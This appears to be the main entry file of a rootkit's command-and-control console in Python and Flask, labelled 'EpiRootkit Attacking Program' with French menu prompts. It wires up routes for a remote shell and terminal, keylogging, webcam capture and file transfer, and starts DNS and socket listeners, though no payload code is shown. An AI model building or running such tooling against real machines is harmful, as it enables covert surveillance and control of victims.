from flask import Flask
from routes import (
    auth_bp, dashboard_bp, terminal_bp, shell_bp, keylogger_bp,
    webcam_bp, upload_bp, download_bp, history_bp
)
from utils.state import app, start_dns_server, socket_listener

app.register_blueprint(auth_bp)
app.register_blueprint(dashboard_bp, url_prefix="/dashboard")
app.register_blueprint(terminal_bp, url_prefix="/terminal")
app.register_blueprint(shell_bp, url_prefix="/shell")
app.register_blueprint(keylogger_bp, url_prefix="/keylogger")
app.register_blueprint(webcam_bp, url_prefix="/webcam")
app.register_blueprint(upload_bp, url_prefix="/upload")
app.register_blueprint(download_bp, url_prefix="/download")
app.register_blueprint(history_bp, url_prefix="/history")


def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    choix = input("Choix du mode (1/2/3) > ").strip()

    if choix == '1':
        from utils.cli_mode import run_cli
        run_cli()
    elif choix == '2':
        app.run(host='0.0.0.0', port=5000)
        start_dns_server()
        socket_listener()
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

if __name__ == '__main__':
    main()
